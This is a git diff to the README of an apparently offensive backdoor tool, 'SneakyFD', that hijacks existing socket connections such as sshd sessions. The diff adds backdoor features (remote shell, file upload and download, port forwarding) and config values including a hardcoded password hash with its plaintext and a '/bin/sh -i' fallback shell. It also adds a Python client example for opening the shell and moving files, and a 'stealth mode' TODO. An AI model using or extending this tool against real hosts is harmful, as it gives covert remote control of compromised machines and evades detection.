@@ -28,9 +28,16 @@ At this point we start sending beacons to the client with current state - we're 
     - By killing the socket owner process (for example `sshd` forks each new connection)
     - By waiting until the socket timed out by the socket owner process
 
+## Backdoor Features
+
+- shell (no pty allocation)
+- file download/upload
+- local/remote port forwarding
+
 ## Demo
 
-![Demo](assets/demo.png)
+![Demo2](assets/demo2.png)
+![Demo1](assets/demo1.png)
 
 ## Configuration
 
@@ -46,24 +53,43 @@ configuraion file [config/config.go](config/config.go)
 | KillProcess | `bool` | kill the socket owner process or wait until the socket timed out by the socket owner process | `true` |
 | WaitProcessTimeout | `time.Duration` | timeout for waiting until the socket timed out by the socket owner process | `3 * time.Minute` |
 | BeaconMagic | `[]byte` | magic bytes for beacons messages | `[]byte{0xDE, 0xAD, 0xBE, 0xEF}` |
+| BackdoorHashedPassword | `string` | hashed password for backdoor authentication | `"b7b3c1f7e43eaca2f6ce67038e8b91f01d1540bbead8d9db6333a3b4226a6abe" // SHA256 - password: "sneakyfd"` |
+| BackdoorVersionBanner | `string` | backdoor version banner (transfered plaintext with default communication cover) | `"SneakyFD"` |
+| BackdoorFallbackShell | `[]string` | shell command to use if not set by client side | `[]string{"/bin/sh -i"}` |
+| BackdoorHostSignerPrivKey | `[]byte` | private key for host signer (AKA hostkey) | `[]byte(`-----BEGIN OPENSSH PRIVA...` |
 
 #### Client Example
 
 ```python
-client.host = "127.0.0.1"
-client.dst_port = 22
-client.src_ports = [(1337, 2337)]
-client.markers = [TCPOptionsMarker(mss=1337)]
+client.config.host = "127.0.0.1"
+client.config.dst_port = 22
+client.config.src_ports = [(1337, 2337)]
+client.config.markers = [TCPOptionsMarker(mss=1337)]
+
+client.connect()
+
+client.shell()
+
+client.download_file(...)
+client.upload_file(...)
+
+client.local_forward(...)
+client.remote_forward(...)
+client.active_forwards
+client.close_all_forwards()
+
+client.disconnect()
 ```
 
 ## TODO
 
-- real payloads (currently `EchoServer` for testing)
 - support tcp6 (mapped addresses as well)
-- encryption
-- sessions managment
-- communication covers
 - make the code cleaner & error handling well
-- ...
+- stealth mode
+- communication covers
+- sessions managment
+- fix multiple remote port forwards closing issue
+- support Linux<5.6 (by ptrace?)
+- SOCKS forwarding (just client side patching)
 - ..
 - .
